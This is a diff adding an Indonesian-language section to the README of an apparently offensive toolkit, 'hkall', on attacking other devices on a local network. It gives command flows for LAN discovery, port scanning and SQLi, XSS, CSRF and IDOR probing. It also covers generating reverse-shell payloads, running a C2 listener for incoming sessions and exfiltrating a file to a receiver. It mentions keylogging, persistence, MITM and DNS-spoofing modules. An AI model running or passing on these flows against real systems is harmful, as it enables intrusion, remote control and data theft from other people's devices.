@@ -174,7 +174,59 @@ Hasil yang diharapkan (lab server vuln):
 
 ---
 
-## E. Struktur menu
+## E. Menarget device lain (LAN/network sendiri)
+
+Semua modul target (`scan`, `enum`, `sqli`, `xss`, `csrf`, `idor`, `spray`, `ddos`, `whois`, `subd`,
+`lan`, `arp`, `exfil`, `serve`) **menerima IP/URL bebas** — bukan cuma localhost. Tinggal ganti
+`127.0.0.1` dengan IP device lain di network kamu.
+
+Persyaratan: target reachable dari device ini (LAN WiFi yang sama / subnet yang dapat dilewati).
+Cek dulu dengan `ping` atau `hkall -m scan --host <IP> --ports 22,80,443`.
+
+### Alur remote recon (device lain)
+```bash
+# 1. temukan IP device lain
+hkall -m lan --host 192.168.1.0/24          # host up
+hkall -m arp --host 192.168.1.0/24          # MAC+IP (root)
+
+# 2. scan port + service
+hkall -m scan --host 192.168.1.20 --ports 1-1000
+
+# 3. kalau ada web service, uji web vuln langsung ke sana
+hkall -m sqli --host "http://192.168.1.20/app?x=1"
+hkall -m xss  --host "http://192.168.1.20/search?q="
+hkall -m csrf --host "http://192.168.1.20/account/change"
+hkall -m idor --host "http://192.168.1.20/api/user/{{id}}" --range 20
+```
+
+### Alur C2 ke device lain (target menjalankan payload)
+Device lain = agen; device ini = listener.
+```bash
+# di device ini (attacker):
+hkall -m shell --host $(IP device ini) --port 4444   # dapat one-liner
+# atau build payload:
+hkall -m payload --host $(IP device ini) --port 8443   # -> data/payload.py
+# taruh payload/one-liner ke device lain (jalankan manual di sana)
+
+# di device ini: buka listener
+hkall -m c2 --port 4444
+# payload di device lain connect balik -> session muncul
+```
+
+### Alur exfil dari device lain
+```bash
+# di device ini (attacker): server penerima
+hkall -m recv --port 12345
+# di device lain: kirim file
+hkall -m exfil --host <IP device ini> --port 12345 --file secret.txt
+```
+
+### Catatan lokal-only (bukan untuk remote)
+`keylog`, `persist`, `ops`, `wifi`, `mitm`, `dnsspoof` — jalan **di tempat tool dijalankan**:
+keylog/ops/wifi pakai device sendiri; mitm/dnsspoof butuh root dan menyasar device lain di LAN
+(ARP/DNS), tapi prosesnya tetap di device ini. Bukan "target execute payload".
+
+## F. Struktur menu
 
 | kategori | modul |
 |----------|-------|
